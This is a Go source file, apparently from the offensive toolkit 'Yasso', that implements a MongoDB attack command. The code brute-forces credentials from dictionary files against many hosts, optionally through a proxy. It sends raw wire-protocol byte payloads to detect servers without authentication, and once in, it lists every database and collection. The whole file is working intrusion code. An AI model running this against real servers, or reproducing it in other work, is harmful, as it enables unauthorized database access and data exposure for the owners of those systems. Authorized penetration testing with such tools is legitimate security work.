package cmd

import (
	"Yasso/config"
	"fmt"
	"github.com/spf13/cobra"
	"net"
	"strings"

	"gopkg.in/mgo.v2"
	"time"
)

var MongoCmd = &cobra.Command{
	Use:   "mongo",
	Short: "MongoDB burst module (support proxy)",
	Run: func(cmd *cobra.Command, args []string) {
		if Hosts == "" {
			_ = cmd.Help()
		} else {
			BruteMongoByUser()
		}
	},
}

func BruteMongoByUser() {
	if BrutePort == 0 {
		BrutePort = 27017
	}
	var ips []string
	var err error
	if Hosts != "" && ConnHost == "" {
		ips, err = ResolveIPS(Hosts)
		if err != nil {
			Println(fmt.Sprintf("resolve hosts address failed %v", err))
			return
		}
		if BruteFlag == true {
			users, pass := ReadTextToDic("mongodb", UserDic, PassDic)
			Println(Clearln + "[*] Brute Module [mongodb]")
			Println(Clearln + "[*] MongoDB Authorized crack")
			Println(fmt.Sprintf(Clearln+"[*] Have [user:%v] [pass:%v] [request:%v]", len(users), len(pass), len(users)*len(pass)*len(ips)))
			SwitchBurp("mongodb", users, pass, ips, BrutePort, Runtime, TimeDuration, "")
		} else {
			Println(Clearln + "[*] May be you want to brute? try to add --crack")
		}
	}
}

func MongoAuth(info config.HostIn, user, pass string) (*mgo.Session, bool, error) {

	conf := &mgo.DialInfo{
		Dial: func(addr net.Addr) (net.Conn, error) {
			return GetConn(addr.String(), info.TimeOut)
		},
		Addrs:     []string{fmt.Sprintf("%s:%d", info.Host, info.Port)},
		Timeout:   info.TimeOut,
		Database:  "test",
		Source:    "admin",
		Username:  user,
		Password:  pass,
		PoolLimit: 4096,
		Direct:    false,
	}
	db, err := mgo.DialWithInfo(conf)
	if err == nil {
		err = db.Ping()
		if err != nil {
			return nil, false, err
		}
		//defer db.Close()
		return db, true, nil

	}
	return nil, false, err
}

func MongoUnAuth(info config.HostIn, user, pass string) (bool, error) {
	var flag = false
	data1 := []byte{58, 0, 0, 0, 167, 65, 0, 0, 0, 0, 0, 0, 212, 7, 0, 0, 0, 0, 0, 0, 97, 100, 109, 105, 110, 46, 36, 99, 109, 100, 0, 0, 0, 0, 0, 255, 255, 255, 255, 19, 0, 0, 0, 16, 105, 115, 109, 97, 115, 116, 101, 114, 0, 1, 0, 0, 0, 0}
	data2 := []byte{72, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 212, 7, 0, 0, 0, 0, 0, 0, 97, 100, 109, 105, 110, 46, 36, 99, 109, 100, 0, 0, 0, 0, 0, 1, 0, 0, 0, 33, 0, 0, 0, 2, 103, 101, 116, 76, 111, 103, 0, 16, 0, 0, 0, 115, 116, 97, 114, 116, 117, 112, 87, 97, 114, 110, 105, 110, 103, 115, 0, 0}
	connString := fmt.Sprintf("%s:%v", info.Host, info.Port)
	conn, err := GetConn(connString, info.TimeOut)
	defer func() {
		if conn != nil {
			conn.Close()
		}
	}()
	if err != nil {
		return false, err
	}
	err = conn.SetReadDeadline(time.Now().Add(time.Duration(info.TimeOut)))
	if err != nil {
		return false, err
	}
	_, err = conn.Write(data1)
	if err != nil {
		return false, err
	}
	reply := make([]byte, 1024)
	count, err := conn.Read(reply)
	if err != nil {
		return false, err
	}
	text := string(reply[0:count])
	if strings.Contains(text, "ismaster") {
		_, err = conn.Write(data2)
		if err != nil {
			return false, err
		}
		count, err := conn.Read(reply)
		if err != nil {
			return false, err
		}
		text := string(reply[0:count])
		if strings.Contains(text, "totalLinesWritten") {
			flag = true
			Println(fmt.Sprintf(Clearln+"[+] Mongodb %v unauthorized", info.Host))
		}
	}
	return flag, nil
}

func MongodbExec(session *mgo.Session) (string, error) {
	var s string
	dbs, err := session.DatabaseNames()
	for _, db := range dbs {
		if collections, err := session.DB(db).CollectionNames(); err == nil {
			s += fmt.Sprintf("%s %v\n", db, collections)
		}
	}
	if err != nil {
		return "", err
	}
	return s, nil
}
